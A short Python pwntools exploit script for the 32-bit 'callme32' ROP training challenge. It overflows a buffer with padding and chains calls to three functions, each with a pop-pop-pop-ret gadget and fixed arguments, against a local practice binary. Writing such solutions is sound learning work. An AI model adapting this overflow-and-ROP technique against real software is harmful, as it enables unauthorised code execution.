from pwn import *
import time

p = process('./callme32')

junkOffset = 0x28+0x4

ROPPOP = p32(0x080487f9)  #ROPgadget to pop 3 variables off the stack and return: pop xxx, pop xxx, pop xxx, ret

callme1 = p32(0x080484f0) 

callme2 = p32(0x08048550)

callme3 = p32(0x080484e0)

variables = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

time.sleep(1)

payload = b'a' * junkOffset + callme1 + ROPPOP + variables + callme2 + ROPPOP + variables + callme3 + ROPPOP + variables

p.sendline(payload)

time.sleep(1)

print(p.recv())



